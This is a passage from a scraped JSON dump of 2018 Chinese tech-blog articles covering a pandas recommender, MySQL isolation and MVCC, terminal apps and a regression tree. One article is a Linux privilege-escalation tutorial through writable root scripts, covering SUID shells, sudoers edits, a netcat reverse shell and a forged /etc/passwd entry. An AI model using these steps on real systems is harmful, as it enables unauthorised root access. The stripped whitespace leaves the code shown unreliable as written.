gs['StarWars(1977)']similarMovies=movieRatings.corrwith(starWarsRatings)similarMovies=similarMovies.dropna()df=pd.DataFrame(similarMovies)4.去除不流行的电影以避免生成不合适的推荐ratingsCount=100movieStats=ratings.groupby('title').agg({'rating':[np.size,np.mean]})popularMovies=movieStats['rating']['size']&gt;=ratingsCountmovieStats[popularMovies].sort_values([('rating','mean')],ascending=False)[:15]1234ratingsCount=100movieStats=ratings.groupby('title').agg({'rating':[np.size,np.mean]})popularMovies=movieStats['rating']['size']&gt;=ratingsCountmovieStats[popularMovies].sort_values([('rating','mean')],ascending=False)[:15]5.提取与目标电影相类似的流行电影df=movieStats[popularMovies].join(pd.DataFrame(similarMovies,columns=['similarity']))df.sort_values(['similarity'],ascending=False)[:15]12df=movieStats[popularMovies].join(pd.DataFrame(similarMovies,columns=['similarity']))df.sort_values(['similarity'],ascending=False)[:15]第二步：基于用户的所有评分做出推荐1.生成每两部电影之间的相似度，并只保留流行电影的相似度userRatings=ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')corrMatrix=userRatings.corr(method='pearson',min_periods=100)12userRatings=ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')corrMatrix=userRatings.corr(method='pearson',min_periods=100)2.对于每部用户看过并评分过的电影，生成推荐（这里我们选择用户0）myRatings=userRatings.loc[0].dropna()simCandidates=pd.Series()foriinrange(0,len(myRatings.index)):#取出与评分过电影相似的电影sims=corrMatrix[myRatings.index[i]].dropna()#以用户对这部电影的评分高低来衡量它的相似性sims=sims.map(lambdax:x*myRatings[i])#将结果放入相似性候选列表中simCandidates=simCandidates.append(sims)simCandidates.sort_values(inplace=True,ascending=False)1234567891011myRatings=userRatings.loc[0].dropna()simCandidates=pd.Series()foriinrange(0,len(myRatings.index)):#取出与评分过电影相似的电影sims=corrMatrix[myRatings.index[i]].dropna()#以用户对这部电影的评分高低来衡量它的相似性sims=sims.map(lambdax:x*myRatings[i])#将结果放入相似性候选列表中simCandidates=simCandidates.append(sims)simCandidates.sort_values(inplace=True,ascending=False)3.将所有相同电影的相似度加和simCandidates=simCandidates.groupby(simCandidates.index).sum()simCandidates.sort_values(inplace=True,ascending=False)12simCandidates=simCandidates.groupby(simCandidates.index).sum()simCandidates.sort_values(inplace=True,ascending=False)4.只保留用户没有看过的电影filteredSims=simCandidates.drop(myRatings.index)1filteredSims=simCandidates.drop(myRatings.index)如何更进一步？在上面的实例中，Pandas与我们的CPU足以处理MovieLens的数据集。然而，当数据集变得更庞大时，处理的时间也会变得更加漫长。因此，你应该转为使用具有更强大处理能力的解决方案，如Spark或MapReduce。我希望我已经成功让你看到，实现一个简单而有效的推荐系统中并没有什么复杂之处。如果你有任何问题，不要犹豫，直接评论就好了。4赞9收藏2评论关于作者：MarticlesJustforfun.个人主页·我的文章·13", "url_object_id": "88d72b6ddc5b2258e74e168818d2bf9e"},{"title": "通过可写文件获取 Linux root 权限的 5 种方法", "url": "http://blog.jobbole.com/114159/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 2, "fav_nums": 2, "comments_nums": 1, "tags": "2,0,1,8,/,0,6,/,2,6, ,·", "content": "原文出处：RajChandel译文出处：ang010elaLinux系统中，全部都是以文件形式存在的，包括目录、设备都是有权限的，共有读、写、可执行三种。管理员为文件设置好权限后，应该要考虑哪些Linux用户会被允许和限制上述的三个权限。通过可写脚本进行root提取的5种方法：·复制/bin/sh到/tmp·设定/bin/dash的SUID位·通过sudoer给登录用户完全的权限·设定/bin/cp的SUID位·逆向连接到恶意代码开启攻击机器，黑掉目标系统，然后进行权限提升。假设成功地通过ssh登录到受害者的机器，并可以访问非root的用户终端。然后使用下面的命令，下面会举例所有有写权限的二进制文件。可以看到一个/lib/log中保存的python文件，在路径中我们看到了sanitizer.py文件的权限为777。Admin要将下面的脚本加入，来清理/tmp中的垃圾文件。如果攻击者能够识别受害者机器中的这类情形，就可以通过下面的方式来提升root权限来破坏系统。第一种方法有许多的方法可以获取root权限，本方法中，我们将/bin/sh复制到/tmp文件夹中，然后设置/tmp/sh的SUID。这种方式非常简单，首先，通过nano编辑器打开文件，然后用rm-r/tmp/*替换下面的命令：在/tmp目录创建一个有SUID权限的sh文件后，允许sh文件时会有root访问权限。可以通过下面的图片进行确认：第二种方法同样地，可以用rm-r/tmp/*替换下面行的内容在设置了/bin/dash的SUID权限后，运行后就可以获取root权限可以通过下面的图进行确认：第三种方法通过netcat逆向了连接后，就可以获取root权限。可以通过下面的图进行确认：第4种方法另一个方法是给登录的用户sudo权限。下面的图中可以看出当前用户wernerbrandes不能允许sudo命令。同样地，可以在下面替换rm-r/tmp/*当输入“sudo-l”命令时会发现，这是sudo用户的一个成员。可以利用sudobash来获取root权限。第5种方法因为在linux类系统中，passwd文件起着很重要的作用。所以，如果攻击者有机会修改passwd文件，那么这将会成为一种动态的权限提升的方式。同样地，可以利用cat命令查看etc/passwd文件的内容。UID:1000&amp;GID:1000就是admin组队成员。下面编辑一下nemo记录来使其成为root组成员，选择etc/passwd的整个内容并复制粘贴到空text文件中。然后，在一个新的终端上生成一个含salt的密码，然后复制。然后粘贴之前复制的含salt的密码在用户nemo的记录词条的X位置处，并修改UID&amp;GID为0:0。完成上面的步骤后，我们就可以将其保存为passwd。利用可写的脚本替换“rm-r/tmp/*”设置/bin/cp的SUID来复制文件。将修改后的passwd文件下载受害者机器的/tmp文件夹中。用下面的命令检查/bin/cp的SUID位是否开启。下面确认是否改变了passwd文件的内容：可以看出passwd文件中的变化：可以执行下面的命令来获取root权限：本文证明了攻击者如何通过可写文件进行linux系统权限提升。2赞2收藏1评论", "url_object_id": "cbb3b429719bda3e099c2522f8c301a8"},{"title": "MySQL 事务隔离级别", "url": "http://blog.jobbole.com/114241/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "praise_nums": 2, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,2,9, ,·", "content": "原文出处：sdlyjzh本文会根据实际工作中碰到的例子，梳理清楚数据库事务的隔离级别。内容很简单，如果你能静下心来看完，一定会对你理解隔离级别有很大的帮助。想象一个场景。抽奖，如果用户中奖了，一般有如下几个流程：扣减奖品数量；记录用户中奖信息；试想如果扣减奖品数量了，结果记录用户中奖数据的时候失败了，那么数据就会出现不一致的问题。这种场景，就可以使用事务。因为事务的一个特性，就是原子性：要么不做，要么全做。上述问题解决了。再想一下这样的场景：在抽奖前，先查询奖品剩余数量，如果剩余数量&lt;1，则任务抽奖活动已经结束，不再进行抽奖。如果事务A扣减奖品数量但未提交，事务B查询剩余奖品数量，此时应该是多少呢？这就和事务的隔离级别有关系了。在讨论隔离级别前，我们先做一些数据库的初始化操作：建表：CREATETABLE`Tran_test`(`id`bigint(20)NOTNULL,`userId`bigint(20)NOTNULLDEFAULT'0',`weChatId`varchar(50)NOTNULLDEFAULT''COMMENT'微信id(openId、uninId)',`orderId`bigint(20)NOTNULLDEFAULT'0'COMMENT'商城订单id',`count`bigint(10)DEFAULTNULL,PRIMARYKEY(`id`))ENGINE=InnoDBDEFAULTCHARSET=utf812345678CREATETABLE`Tran_test`(`id`bigint(20)NOTNULL,`userId`bigint(20)NOTNULLDEFAULT'0',`weChatId`varchar(50)NOTNULLDEFAULT''COMMENT'微信id(openId、uninId)',`orderId`bigint(20)NOTNULLDEFAULT'0'COMMENT'商城订单id',`count`bigint(10)DEFAULTNULL,PRIMARYKEY(`id`))ENGINE=InnoDBDEFAULTCHARSET=utf8初始化1个奖品：insertintoTran_test(id,count)values(1,1)1insertintoTran_test(id,count)values(1,1)未提交读事务中的修改，即使没有提交，也会被其他事务读取。下面通过mysql演示：设置隔离级别为为提交读：SETGLOBALTRANSACTIONISOLATIONLEVELREADUNCOMMITTED;1SETGLOBALTRANSACTIONISOLATIONLEVELREADUNCOMMITTED;事务A事务Bstarttransaction;starttransaction;select*fromTran_testwhereid=1;(count=1)updateTran_testsetcount=count-1whereid=1;select*fromTran_testwhereid=1;(count=0)select*fromTran_test;(count=0)rollback;commit;可以看到，事务B读取到了事务A未提交的数据，它任务抽奖活动已经结束。但如果此时事务A回滚，count仍然为1，则活动实际是未结束的，这就是脏读。因此，实际中，一般不会采用这种隔离级别。提交读提交读隔离级别可以解决上述脏读问题，其只能读到其他事务已经提交的数据。更改数据库隔离级别：SETGLOBALTRANSACTIONISOLATIONLEVELREADCOMMITTED;1SETGLOBALTRANSACTIONISOLATIONLEVELREADCOMMITTED;事务A事务Bstarttransaction;starttransaction;select*fromTran_testwhereid=1;(count=1)updateTran_testsetcount=count-1whereid=1;select*fromTran_test;(count=0)select*fromTran_testwhereid=1;(count=1)commit;select*fromTran_testwhereid=1;(count=0)commit可以看到，在事务A提交前的改动，事务B是读取不到的。只有A事务提交后，B才能读取到事务A的改动。我们看到，在事务B中，先后两次读取，count的值是不一样的，这就是不可重复读。而可重复读隔离级别可以解决这个问题。可重复读更改数据库隔离级别：SETGLOBALTRANSACTIONISOLATIONLEVELREPEATABLEREAD;1SETGLOBALTRANSACTIONISOLATIONLEVELREPEATABLEREAD;事务A事务Bstarttransaction;starttransaction;select*fromTran_testwhereid=1;(count=1)updateTran_testsetcount=count-1whereid=1;select*fromTran_test;(count=0)select*fromTran_testwhereid=1;(count=1)commit;select*fromTran_testwhereid=1;(count=1)commit可以看到，不论事务A是否提交，事务B读到的count值都是不变的。这就是可重复读。除了上面提到的脏读、不可重复读，还有一种情况是幻读：在事务中，前后两次查询，记录数量是不一样的。比如事务B是事务A插入一条记录的前后执行查询，会发现相同的查询条件，查出来的记录数不一样。由于mysql的RR（可重复读）一并解决了幻读的问题，所以我们直接看上述场景，在mysql中的表现：事务A事务Bstarttransaction;starttransaction;selectcount(1)fromTran_test；(1)insertintoTran_test(id,count)value(2,2);commit;selectcount(1)fromTran_test；(1)commit可见，在事务A提交前后，事务B查询的结果数量是一直的，并没有出现幻读的情况。一点思考下面默认都是讨论的msyqlRR隔离级别的情况。如果两个用户同时抽奖，而且同时中奖。两者都进入了中奖的事务。A事务扣减了奖品数量，B也执行了扣减数量。假设奖品数量是N，如果是可重复读，那么，如果两个事务并行进行，那么不论A有没有提交，B读到的数量都是N，执行后为N-1，而事务A也是N-1，这样不就有问题了吗？我们期望的是N-2。当初这个问题让我很困惑。这反应了当时我对数据库锁和快照读、当前读两个知识点的欠缺。快照读、当前读将设事务A已经提交，由于是可重复读，那事务B读到的奖品数量一致是N，执行-1，数据变成N-1，而不是我们期望的N-2。如果理解了快照读和当前读的概念，上面的困惑就不会存在了。在事务中，执行普通select查询之后，会创建快照，后面再执行相同的select语句时，查询的其实是前面生成的快照。这也就是为什么会有可重复读。而如果执行select*fromtablewhere?lockinsharemode;select*fromtablewhere?forupdate;insertintotablevalues(…);updatetableset?where?;deletefromtablewhere?;12345select*fromtablewhere?lockinsharemode;select*fromtablewhere?forupdate;insertintotablevalues(…);updatetableset?where?;deletefromtablewhere?;会执行当前读，获取最新数据。回到前面的问题，如果事务B执行N-1操作，会触发当前读，读取事务A提交后的数据，也就是N-1，在此基础上执行-1操作，最终N变成N-2。并发更新上面解决了事务A已经提交的额情况。但如果事务A更新奖品数量后但还未提交呢？此时事务B执行当前读拿到的也是N啊。了解数据库锁机制的话，就不会有这种困惑了。事务A提交前，会一直持有排他锁（具体是行锁还是表锁，要看查询条件有没有走索引），此时事务B更新是会阻塞的。也就是说，只有事务A提交，或回滚之后，事务B才能获得排它锁，从而进行更新奖品的操作。关于数据库的锁，大家可以参考这篇文章：http://hedengcheng.com/?p=7712赞收藏评论", "url_object_id": "7695e72cfe180b1aba1ddb02ab4d4c1e"},{"title": "4 款酷炫的终端应用", "url": "http://blog.jobbole.com/114268/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/caf40e93894ca408fc2b86171e34d5bb.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,1,1, ,·", "content": "原文出处：Atolstoy译文出处：Linux中国/geekpi许多Linux用户认为在终端中工作太复杂、无聊，并试图逃避它。但这里有个改善方法——四款终端下很棒的开源程序。它们既有趣又易于使用，甚至可以在你需要在命令行中工作时照亮你的生活。NoMoreSecrets这是一个简单的命令行工具，可以重现1992年电影Sneakers中所见的著名数据解密效果。该项目让你编译个nms命令，该命令与管道数据一起使用并以混乱字符的形式打印输出。开始后，你可以按任意键，并能在输出中看到很酷的好莱坞效果的现场“解密”。安装说明一个全新安装的FedoraWorkstation系统已经包含了从源代码构建NoMoreSecrets所需的一切。只需在终端中输入以下命令：gitclonehttps://github.com/bartobri/no-more-secrets.gitcd./no-more-secretsmakenmsmakesneakers##Optionalsudomakeinstall123456gitclonehttps://github.com/bartobri/no-more-secrets.gitcd./no-more-secretsmakenmsmakesneakers##Optionalsudomakeinstall对于那些记得原来的电影的人来说，sneakers命令是一个小小的彩蛋，但主要的英雄是nms。使用管道将任何Linux命令重定向到nms，如下所示：systemctllist-units--type=target|nms12systemctllist-units--type=target|nms当文本停止闪烁，按任意键“解密”它。上面的systemctl命令只是一个例子——你几乎可以用任何东西替换它！lolcat这是一个用彩虹为终端输出着色的命令。没什么用，但是它看起来很棒！安装说明lolcat是一个Ruby软件包，可从官方RubyGems托管中获得。所以，你首先需要gem客户端：sudodnfinstall-yrubygems12sudodnfinstall-yrubygems然后安装lolcat本身：geminstalllolcat12geminstalllolcat再说一次，使用lolcat命令管道任何其他命令，并在Fedora终端中享受彩虹（和独角兽！）。chafachafa是一个命令行图像转换器和查看器。它可以帮助你在不离开终端的情况下欣赏图像。语法非常简单：chafa/path/to/your/image12chafa/path/to/your/image你可以将几乎任何类型的图像投射到chafa，包括JPG、PNG、TIFF、BMP或几乎任何ImageMagick支持的图像–这是chafa用于解析输入文件的引擎。最酷的部分是chafa还可以在你的终端内显示非常流畅的GIF动画！安装说明chafa还没有为Fedora打包，但从源代码构建它很容易。首先，获取必要的构建依赖项：sudodnfinstall-yautoconfautomakelibtoolgtk-docglib2-develImageMagick-devel12sudodnfinstall-yautoconfautomakelibtoolgtk-docglib2-develImageMagick-devel接下来，克隆代码或从项目的GitHub页面下载快照，然后cd到chafa目录，这样就行了：gitclonehttps://github.com/hpjansson/chafa./autogen.shmakesudomakeinstall12345gitclonehttps://github.com/hpjansson/chafa./autogen.shmakesudomakeinstall大的图像在第一次运行时可能需要一段时间处理，但chafa会缓存你加载的所有内容。下一次运行几乎是瞬间完成的。BrowshBrowsh是完善的终端网页浏览器。它比Lynx更强大，当然更引人注目。Browsh以无头模式启动FirefoxWeb浏览器（因此你无法看到它）并在特殊Web扩展的帮助下将其与你的终端连接。因此，Browsh能像Firefox一样呈现所有富媒体内容，只是有点像素化的风格。安装说明该项目为各种Linux发行版提供了包，包括Fedora。以这种方式安装：sudodnfinstall-yhttps://github.com/browsh-org/browsh/releases/download/v1.4.6/browsh_1.4.6_linux_amd64.rpm12sudodnfinstall-yhttps://github.com/browsh-org/browsh/releases/download/v1.4.6/browsh_1.4.6_linux_amd64.rpm之后，启动browsh命令并给它几秒钟加载。按Ctrl+L将焦点切换到地址栏并开始浏览Web，就像以前一样使用！使用Ctrl+Q返回终端。1赞收藏评论", "url_object_id": "f3ed25a5362621eb1688aa918d122c45"},{"title": "回归树的原理及其 Python 实现", "url": "http://blog.jobbole.com/114261/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/ff247977ac3e5237654ad324e8c880ed.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,1,0, ,·", "content": "本文作者：伯乐在线-伯乐在线读者。未经作者许可，禁止转载！欢迎加入伯乐在线专栏作者。提到回归树，相信大家应该都不会觉得陌生（不陌生你点进来干嘛[捂脸]），大名鼎鼎的GBDT算法就是用回归树组合而成的。本文就回归树的基本原理进行讲解，并手把手、肩并肩地带您实现这一算法。完整实现代码请参考github：https://github.com/tushushu/Imylu/blob/master/regression_tree.py1.原理篇我们用人话而不是大段的数学公式，来讲讲回归树是怎么一回事。1.1最简单的模型如果预测某个连续变量的大小，最简单的模型之一就是用平均值。比如同事的平均年龄是28岁，那么新来了一批同事，在不知道这些同事的任何信息的情况下，直觉上用平均值28来预测是比较准确的，至少比0岁或者100岁要靠谱一些。我们不妨证明一下我们的直觉：定义损失函数L，其中y_hat是对y预测值，使用MSE来评估损失：对y_hat求导:令导数等于0，最小化MSE，则:所以，结论，如果要用一个常量来预测y，用y的均值是一个最佳的选择。1.2加一点难度仍然是预测同事年龄，这次我们预先知道了同事的职级，假设职级的范围是整数1-10，如何能让这个信息帮助我们更加准确的预测年龄呢？一个思路是根据职级把同事分为两组，这两组分别应用我们之前提到的“平均值”模型。比如职级小于5的同事分到A组，大于或等于5的分到B组，A组的平均年龄是25岁，B组的平均年龄是35岁。如果新来了一个同事，职级是3，应该被分到A组，我们就预测他的年龄是25岁。1.3最佳分割点还有一个问题待解决，如何取一个最佳的分割点对不同职级的同事进行分组呢？我们尝试所有m个可能的分割点P_i，沿用之前的损失函数，对A、B两组分别计算Loss并相加得到L_i。最小的L_i所对应的P_i就是我们要找的“最佳分割点”。1.4运用多个变量再复杂一些，如果我们不仅仅知道了同事的职级，还知道了同事的工资（貌似不科学），该如何预测同事的年龄呢？我们可以分别根据职级、工资计算出职级和工资的最佳分割点P_1,P_2，对应的LossL_1,L_2。然后比较L_1和L2，取较小者。假设L_1&lt;L_2，那么按照P_1把不同职级的同事分为A、B两组。在A、B组内分别计算工资所对应的分割点，再分为C、D两组。这样我们就得到了AC,AD,BC,BD四组同事以及对应的平均年龄用于预测。1.5答案揭晓如何实现这种1to2,2to4,4to8的算法呢？熟悉数据结构的同学自然会想到二叉树，这种树被称为回归树，顾名思义利用树形结构求解回归问题。2.实现篇本人用全宇宙最简单的编程语言——Python实现了回归树算法，没有依赖任何第三方库，便于学习和使用。简单说明一下实现过程，更详细的注释请参考本人github上的代码。2.1创建Node类初始化，存储预测值、左右结点、特征和分割点classNode(object):def__init__(self,score=None):self.score=scoreself.left=Noneself.right=Noneself.feature=Noneself.split=None1234567classNode(object):def__init__(self,score=None):self.score=scoreself.left=Noneself.right=Noneself.feature=Noneself.split=None2.2创建回归树类初始化，存储根节点和树的高度。classRegressionTree(object):def__init__(self):self.root=Node()self.height=01234classRegressionTree(object):def__init__(self):self.root=Node()self.height=02.3计算分割点、MSE根据自变量X、因变量y、X元素中被取出的行号idx，列号feature以及分割点split，计算分割后的MSE。注意这里为了减少计算量，用到了方差公式：def_get_split_mse(self,X,y,idx,feature,split):split_sum=[0,0]split_cnt=[0,0]split_sqr_sum=[0,0]foriinidx:xi,yi=X[i][feature],y[i]ifxi&lt;split:split_cnt[0]+=1split_sum[0]+=yisplit_sqr_sum[0]+=yi**2else:split_cnt[1]+=1split_sum[1]+=yisplit_sqr_sum[1]+=yi**2split_avg=[split_sum[0]/split_cnt[0],split_sum[1]/split_cnt[1]]split_mse=[split_sqr_sum[0]-split_sum[0]*split_avg[0],split_sqr_sum[1]-split_sum[1]*split_avg[1]]returnsum(split_mse),split,split_avg1234567891011121314151617181920def_get_split_mse(self,X,y,idx,feature,split):split_sum=[0,0]split_cnt=[0,0]split_sqr_sum=[0,0]foriinidx:xi,yi=X[i][feature],y[i]ifxi&lt;split:split_cnt[0]+=1split_sum[0]+=yisplit_sqr_sum[0]+=yi**2else:split_cnt[1]+=1split_sum[1]+=yisplit_sqr_sum[1]+=yi**2split_avg=[split_sum[0]/split_cnt[0],split_sum[1]/split_cnt[1]]split_mse=[split_sqr_sum[0]-split_sum[0]*split_avg[0],split_sqr_sum[1]-split_sum[1]*split_avg[1]]returnsum(split_mse),split,split_avg2.4计算最佳分割点遍历特征某一列的所有的不重复的点，找出MSE最小的点作为最佳分割点。如果特征中没有不重复的元素则返回None。def_choose_split_point(self,X,y,idx,feature):unique=set([X[i][feature]foriinidx])iflen(unique)==1:returnNoneunique.remove(min(unique))mse,split,split_avg=min((self._get_split_mse(X,y,idx,feature,split)forsplitinunique),key=lambdax:x[0])returnmse,feature,split,split_avg12345678910def_choose_split_point(self,X,y,idx,feature):unique=set([X[i][feature]foriinidx])iflen(unique)==1:returnNoneunique.remove(min(unique))mse,split,split_avg=min((self._get_split_mse(X,y,idx,feature,split)forsplitinunique),key=lambdax:x[0])returnmse,feature,split,split_avg2.5选择最佳特征遍历所有特征，计算最佳分割点对应的MSE，找出MSE最小的特征、对应的分割点，左右子节点对应的均值和行号。如果所有的特征都没有不重复元素则返回Nonedef_choose_feature(self,X,y,idx):m=len(X[0])split_rets=[xforxinmap(lambdax:self._choose_split_point(X,y,idx,x),range(m))ifxisnotNone]ifsplit_rets==[]:returnNone_,feature,split,split_avg=min(split_rets,key=lambdax:x[0])idx_split=[[],[]]whileidx:i=idx.pop()xi=X[i][feature]ifxi&lt;split:idx_split[0].append(i)else:idx_split[1].append(i)returnfeature,split,split_avg,idx_split12345678910111213141516171819def_choose_feature(self,X,y,idx):m=len(X[0])split_rets=[xforxinmap(lambdax:self._choose_split_point(X,y,idx,x),range(m))ifxisnotNone]ifsplit_rets==[]:returnNone_,feature,split,split_avg=min(split_rets,key=lambdax:x[0])idx_split=[[],[]]whileidx:i=idx.pop()xi=X[i][feature]ifxi&lt;split:idx_split[0].append(i)else:idx_split[1].append(i)returnfeature,split,split_avg,idx_split2.6规则转文字将规则用文字表达出来，方便我们查看规则。def_expr2literal(self,expr):feature,op,split=exprop=\"&gt;=\"ifop==1else\"&lt;\"return\"Feature%d%s%.4f\"%(feature,op,split)1234def_expr2literal(self,expr):feature,op,split=exprop=\"&gt;=\"ifop==1else\"&lt;\"return\"Feature%d%s%.4f\"%(feature,op,split)2.7获取规则将回归树的所有规则都用文字表达出来，方便我们了解树的全貌。这里用到了队列+广度优先搜索。有兴趣也可以试试递归或者深度优先搜索。def_get_rules(self):que=[[self.root,[]]]self.rules=[]whileque:nd,exprs=que.pop(0)ifnot(nd.leftornd.right):literals=list(map(self._expr2literal,exprs))self.rules.append([literals,nd.score])ifnd.left:rule_left=copy(exprs)rule_left.append([nd.feature,-1,nd.split])que.append([nd.left,rule_left])ifnd.right:rule_right=copy(exprs)rule_right.append([nd.feature,1,nd.split])que.append([nd.right,rule_right])12345678910111213141516171819def_get_rules(self):que=[[self.root,[]]]self.rules=[]whileque:nd,exprs=que.pop(0)ifnot(nd.leftornd.right):literals=list(map(self._expr2literal,exprs))self.rules.append([literals,nd.score])ifnd.left:rule_left=copy(exprs)rule_left.append([nd.feature,-1,nd.split])que.append([nd.left,rule_left])ifnd.right:rule_right=copy(exprs)rule_right.append([nd.feature,1,nd.split])que.append([nd.right,rule_right])2.8训练模型仍然使用队列+广度优先搜索，训练模型的过程中需要注意：控制树的最大深度max_depth；控制分裂时最少的样本量min_samples_split；叶子结点至少有两个不重复的y值；至少有一个特征是没有重复值的。deffit(self,X,y,max_depth=5,min_samples_split=2):self.root=Node()que=[[0,self.root,list(range(len(y)))]]whileque:depth,nd,idx=que.pop(0)ifdepth==max_depth:breakiflen(idx)&lt;min_samples_splitor\\set(map(lambdai:y[i],idx))==1:continuefeature_rets=self._choose_feature(X,y,idx)iffeature_retsisNone:continuend.feature,nd.split,split_avg,idx_split=feature_retsnd.left=Node(split_avg[0])nd.right=Node(split_avg[1])que.append([depth+1,nd.left,idx_split[0]])que.append([depth+1,nd.right,idx_split[1]])self.height=depthself._get_rules()1234567891011121314151617181920212223242526deffit(self,X,y,max_depth=5,min_samples_split=2):self.root=Node()que=[[0,self.root,list(range(len(y)))]]whileque:depth,nd,idx=que.pop(0)ifdepth==max_depth:breakiflen(idx)&lt;min_samples_splitor\\set(map(lambdai:y[i],idx))==1:continuefeature_rets=self._choose_feature(X,y,idx)iffeature_retsisNone:continuend.feature,nd.split,split_avg,idx_split=feature_retsnd.left=Node(split_avg[0])nd.right=Node(split_avg[1])que.append([depth+1,nd.left,idx_split[0]])que.append([depth+1,nd.right,idx_split[1]])self.height=depthself._get_rules()2.9打印规则模型训练完毕，查看一下模型生成的规则defprint_rules(self):fori,ruleinenumerate(self.rules):literals,score=ruleprint(\"Rule%d:\"%i,'|'.join(literals)+'=&gt;split_hat%.4f'%score)12345defprint_rules(self):fori,ruleinenumerate(self.rules):literals,score=ruleprint(\"Rule%d:\"%i,'|'.join(literals)+'=&gt;split_hat%.4f'%score)2.10预测一个样本def_predict(self,row):nd=self.rootwhilend.leftandnd.right:ifrow[nd.feature]&lt;nd.split:nd=nd.leftelse:nd=nd.rightreturnnd.score12345678def_predict(self,row):nd=self.rootwhilend.leftandnd.right:ifrow[nd.feature]&lt;nd.split:nd=nd.leftelse:nd=nd.rightreturnnd.score2.11预测多个样本defpredict(self,X):return[self._predict(Xi)forXiinX]12defpredict(self,X):return[self._predict(Xi)forXiinX]3效果评估3.1main函数使用著名的波士顿房价数据集，按照7:3的比例拆分为训练集和测试集，训练模型，并统计准确度。@run_timedefmain():print(\"TesingtheaccuracyofRegressionTree...\")#LoaddataX,y=load_boston_house_prices()#Splitdatarandomly,trainsetrate70%X_train,X_test,y_train,y_test=train_test_split(X,y,random_state=10)#Trainmodelreg=RegressionTree()reg.fit(X=X_train,y=y_train,max_depth=4)#Showrulesreg.print_rules()#Modelaccuracyget_r2(reg,X_test,y_test)123456789101112131415@run_timedefmain():print(\"TesingtheaccuracyofRegressionTree...\")#LoaddataX,y=load_boston_house_prices()#Splitdatarandomly,trainsetrate70%X_train,X_test,y_train,y_test=train_test_split(X,y,random_state=10)#Trainmodelreg=RegressionTree()reg.fit(X=X_train,y=y_train,max_depth=4)#Showrulesreg.print_rules()#Modelaccuracyget_r2(reg,X_test,y_test)3.2效果展示最终生成了15条规则，拟合优度0.801，运行时间1.74秒，效果还算不错~3.3工具函数本人自定义了一些工具函数，可以在github上查看https://github.com/tushushu/Imylu/blob/master/utils.py1.run_time–测试函数运行时间2.load_boston_house_prices–加载波士顿房价数据3.train_test_split–拆分训练集、测试机4.get_r2–计算拟合优度总结回归树的原理：损失最小化，平均值大法。最佳行与列，效果顶呱呱。回归树的实现：一顿操作猛如虎，加减乘除二叉树。原文：https://zhuanlan.zhihu.com/p/41688007【关于作者】李小文：先后从事过数据分析、数据挖掘工作，主要开发语言是Python，现任一家小型互联网公司的算法工程师。Github:https://github.com/tushushu1赞1收藏评论关于作者：伯乐在线读者①本账号用于发布那些在伯乐在线无账号的读者的投稿，包括译文和原创文章。②欢迎加入伯乐在线专栏作者：http://blog.jobbole.com/99322/个人主页·我的文章·34", "url_object_id": "172ca0d8f74ecee41e443a7233849043"},{"title": "MySQL多版本并发控制机制(MVCC)-源码浅析", "url": "http://blog.jobbole.com/114273/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,1,5, ,·", "content": "原文出处：无毁的湖光-Al前言作为一个数据库爱好者，自己动手写过简单的SQL解析器以及存储引擎，但感觉还是不够过瘾。&lt;&lt;事务处理-概念与技术&gt;&gt;诚然讲的非常透彻，但只能提纲挈领，不能让你玩转某个真正的数据库。感谢cmake,能够让我在mac上用xcode去debugMySQL,从而能去领略它的各种实现细节。笔者一直对数据库的隔离性很好奇，此篇博客就是我debugMySQL过程中的偶有所得。(注:本文的MySQL采用的是MySQL-5.6.35版本)MVCC(多版本并发控制机制)隔离性也可以被称作并发控制、可串行化等。谈到并发控制首先想到的就是锁，MySQL通过使用两阶段锁的方式实现了更新的可串行化，同时为了加速查询性能，采用了MVCC(MultiVersionConcurrencyControl)的机制，使得不用锁也可以获取一致性的版本。RepeatableReadMySQL的通过MVCC以及(Next-KeyLock)实现了可重复读(RepeatableRead),其思想(MVCC)就是记录数据的版本变迁，通过精巧的选择不同数据的版本从而能够对用户呈现一致的结果。如下图所示:上图中，(A=50|B=50)的初始版本为1。1.事务t1在selectA时候看到的版本为1，即A=502.事务t2对A和B的修改将版本升级为2,即A=0,B=1003.事务t1再此selectB的时候看到的版本还是1,即B=50这样就隔离了版本的影响，A+B始终为100。ReadCommit而如果不通过版本控制机制，而是读到最近提交的结果的话，则隔离级别是readcommit,如下图所示:在这种情况下，就需要使用锁机制(例如selectforupdate)将此A,B记录锁住，从而获得正确的一致结果,如下图所示：MVCC的优势当我们要对一些数据做一些只读操作来检查一致性，例如检查账务是否对齐的操作时候，并不希望加上对性能损耗很大的锁。这时候MVCC的一致性版本就有很大的优势了。MVCC(实现机制)本节就开始谈谈MVCC的实现机制,注意MVCC仅仅在纯select时有效(不包括selectforupdate,lockinsharemode等加锁操作,以及updateinsert等)。select运行栈首先我们追踪一下一条普通的查询sql在mysql源码中的运行过程,sql为(select*fromtest);其运行栈为:handle_one_connectionMySQL的网络模型是onerequestonethread|-do_handle_one_connection|-do_command|-dispatch_command|-mysql_parse解析SQL|-mysql_execute_command|-execute_sqlcom_select执行select语句|-handle_select...一堆parsejoin等的操作，当前并不关心|-*tab-&gt;read_record.read_record读取记录1234567891011handle_one_connectionMySQL的网络模型是onerequestonethread|-do_handle_one_connection|-do_command|-dispatch_command|-mysql_parse解析SQL|-mysql_execute_command|-execute_sqlcom_select执行select语句|-handle_select...一堆parsejoin等的操作，当前并不关心|-*tab-&gt;read_record.read_record读取记录由于mysql默认隔离级别是repeatable_read(RR),所以read_record重载为rr_sequential(当前我们并不关心select通过index扫描出row之后再通过condition过滤的过程)。继续追踪:read_record|-rr_sequential|-ha_rnd_next|-ha_innobase::rnd_next这边就已经到了innodb引